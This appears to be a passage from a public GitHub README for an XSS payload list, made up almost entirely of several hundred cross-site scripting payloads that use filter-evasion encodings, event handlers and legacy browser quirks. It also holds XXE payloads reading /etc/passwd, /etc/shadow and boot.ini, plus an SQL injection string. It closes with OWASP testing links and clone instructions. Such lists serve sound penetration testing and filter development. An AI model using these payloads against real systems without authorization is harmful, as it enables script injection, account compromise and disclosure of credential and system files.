"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
<script\x2F>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
"><img src=x onerror=javascript:alert(1)>
"><img src=x onerror=javascript:alert('1')>
"><img src=x onerror=javascript:alert("1")>
"><img src=x onerror=javascript:alert(`1`)>
"><img src=x onerror=javascript:alert(('1'))>
"><img src=x onerror=javascript:alert(("1"))>
"><img src=x onerror=javascript:alert((`1`))>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
<script>javascript:alert(1)<\x00/script>
<img src=# onerror\x3D"javascript:alert(1)" >
<input onfocus=javascript:alert(1) autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:javascript:alert(1)//
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<video><source onerror="javascript:javascript:alert(1)">
<video onerror="javascript:javascript:alert(1)"><source>
<form><button formaction="javascript:javascript:alert(1)">X
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<? foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<// style=x:expression\28javascript:alert(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<event-source src="%(event)s" onload="javascript:alert(1)">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<script>javascript:alert(1)</script>
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=`javascript:javascript:alert(1)`>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="jav ascript:javascript:alert(1);">
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<IMG SRC="javascript:javascript:alert(1)"
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BR SIZE="&{javascript:alert(1)}">
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="width:expression(javascript:alert(1));">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:javascript:alert(1);//">
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<embed code=javascript:javascript:alert(1);></embed>
<frameset onload=javascript:javascript:alert(1)></frameset>
<object onerror=javascript:javascript:alert(1)>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<IMG SRC=&{javascript:alert(1);};>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<iframe  src="&Tab;javascript:prompt(1)&Tab;">
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt >alert&lpar;1&rpar; {Opera}
<img/src=`` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=``&NewLine; onerror=alert(1)&NewLine;
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<script /**/>/**/alert(1)/**/</script /**/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe// src=javaSCRIPT&colon;alert(1)
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<var onmouseover="prompt(1)">On Mouse Over</var>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<script>alert(1);</script>
"/></a></><img src=1.gif onerror=alert(1)>
<div style="x:expression((window.r==1)?'':eval('r=1;
<script>var var = 1; alert(var)</script>
<scrscriptipt>alert(1)</scrscriptipt>
</script><script>alert(1)</script>
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
1script3document.vulnerable=true;1/script3
<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;
<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
1script3document.vulnerable=true;1/script3
<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
<;/script>;<;script>;alert(1)<;/script>;
<;scrscriptipt>;alert(1)<;/scrscriptipt>;
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
<img src=xss onerror=alert(1)>
%253cscript%253ealert(1)%253c/script%253e
foo<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<marquee onstart='javascript:alert('1');'>=(◕_◕)=


###### Testing for Stored Cross site scripting (OTG-INPVAL-002)

* 👉 https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)

###### Testing for DOM-based Cross site scripting (OTG-CLIENT-001)

* 👉 https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)

###### DOM Based XSS

* 👉 https://www.owasp.org/index.php/DOM_Based_XSS

###### Cross-Site Scripting (XSS) Cheat Sheet | Veracode

* 👉 https://www.veracode.com/security/xss

#### Recommended books :

* [XSS Attacks: Cross-site Scripting Exploits and Defense](https://books.google.com.tr/books/about/XSS_Attacks.html?id=dPhqDe0WHZ8C)

* [XSS Cheat Sheet](https://leanpub.com/xss)


### Cloning an Existing Repository ( Clone with HTTPS )
```
root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/xss-payload-list.git
```

### Cloning an Existing Repository ( Clone with SSH )
```
root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/xss-payload-list.git
```

### Published Website :

##### Kitploit - https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html

### Donate!

Support the authors:

#### LiberaPay:

<noscript><a href="https://liberapay.com/ismailtasdelen/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
--end--
